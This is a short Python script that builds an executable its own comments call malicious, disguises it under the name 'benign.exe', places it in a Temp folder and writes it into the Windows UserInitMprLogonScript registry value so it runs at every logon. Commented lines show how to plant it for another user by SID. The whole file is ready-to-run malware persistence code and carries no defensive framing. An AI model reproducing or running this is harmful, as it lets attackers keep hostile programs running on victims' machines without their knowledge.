import os, shutil, winreg
filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename, filedir)

# Windows logon script keys
reghive = winreg.HKEY_CURRENT_USER
regpath = "Environment"

# Get user SIDS => c:\>wmic useraccount get name,sid
# If you want to add the exe to another in the system use below instead of two uncommented lines above.
#reghive = winreg.HKEY_USERS
#regpath = "S-1-5-21-524849353-310586374-791561826-1002\Environment"

# Add registry logon script
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)


